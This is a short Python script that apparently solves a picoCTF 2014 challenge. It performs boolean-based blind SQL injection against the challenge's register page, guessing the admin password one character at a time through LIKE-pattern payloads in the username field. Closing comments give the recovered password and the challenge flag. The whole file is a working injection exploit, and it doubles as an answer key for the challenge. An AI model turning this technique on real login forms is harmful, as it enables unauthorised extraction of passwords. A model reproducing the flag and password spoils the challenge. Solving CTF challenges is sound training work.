#!/usr/bin/env python

import requests
import string

charset = string.ascii_lowercase + string.ascii_uppercase + '_'
flag = ''
payload = '''admin' AND password LIKE '{}%'''
target = 'http://web2014.picoctf.com/injection4/register.php'

while True:
	for c in charset:
		tmp = flag + c
		data = {'username': payload.format(tmp)}
		r = requests.post(target, data=data)
		print '[*] trying: ' + tmp
		if 'disabled' not in r.content:
			flag += c
			print '[*] found: ' + tmp
			break
	else:
		break

print 'Password: ' + flag

# password: youllneverguessthispassword
# flag: whereof_one_cannot_speak_thereof_one_must_be_silent